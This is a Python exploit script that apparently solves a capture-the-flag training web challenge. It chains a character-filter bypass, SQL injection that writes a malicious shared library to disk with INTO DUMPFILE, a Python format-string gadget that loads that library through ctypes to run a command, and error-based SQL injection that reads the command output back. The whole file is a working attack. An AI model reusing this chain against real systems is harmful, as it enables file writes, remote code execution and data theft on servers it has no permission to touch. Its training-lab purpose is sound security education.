import requests, binascii, random, string

#URL = "http://127.0.0.1:5002/"  # change
URL = 'https://web-doubles.training.bksec.vn:8000/'
FORBIDDEN = ['"', "(", ")", " ", "," , "'", "\\", "/", "*", "+%", "-", ";", "#"]
letters = "abcdefghijklmnopqrstuvwxyz"
m = {c: letters[i] for i, c in enumerate(FORBIDDEN)}

def enc_char(ch):
    i = FORBIDDEN.index(ch)
    v = m[ch]
    return f"{{{v}}}{{{v}.FORBIDDEN_CHARACTERS[{i}]}}"

def encode(s):
    out = []
    i = 0
    while i < len(s):
        if s[i:i+2] == "+%":
            out.append(enc_char("+%"))
            i += 2
            continue
        ch = s[i]
        out.append(enc_char(ch) if ch in m else ch)
        i += 1
    return "".join(out)

s = requests.Session()

# 0) Build this locally first:
#    gcc -shared -fPIC pwn.c -o pwn.so
#    pwn.c:
#      #include <stdlib.h>
#      __attribute__((constructor)) void init(){ system("/readflag > /tmp/flag_out"); }

so_hex = binascii.hexlify(open("pwn.so", "rb").read()).decode()
lib = "/tmp/u_" + "".join(random.choice(string.ascii_lowercase+string.digits) for _ in range(6)) + ".so"

# 1) SQLi: write .so
sql1 = f"' UNION SELECT 0x{so_hex},'', '' INTO DUMPFILE '{lib}'-- -"
s.post(URL, data={"username": encode(sql1), "password": "x"})

# 2) Format gadget: dlopen(lib)
slash = enc_char("/")
path_expr = lib.replace("/", slash)
payload2 = f"{{{{x}}}}{{{{x.__init__.__globals__[ctypes].cdll[{path_expr}]}}}}"
s.post(URL, data={"username": payload2, "password": "x"})

# 3) SQLi error-based exfil of command output
sql3 = "' AND EXTRACTVALUE(1,CONCAT(0x7e,LOAD_FILE('/tmp/flag_out')))-- -"
r = s.post(URL, data={"username": encode(sql3), "password": "x"})
print(r.text)
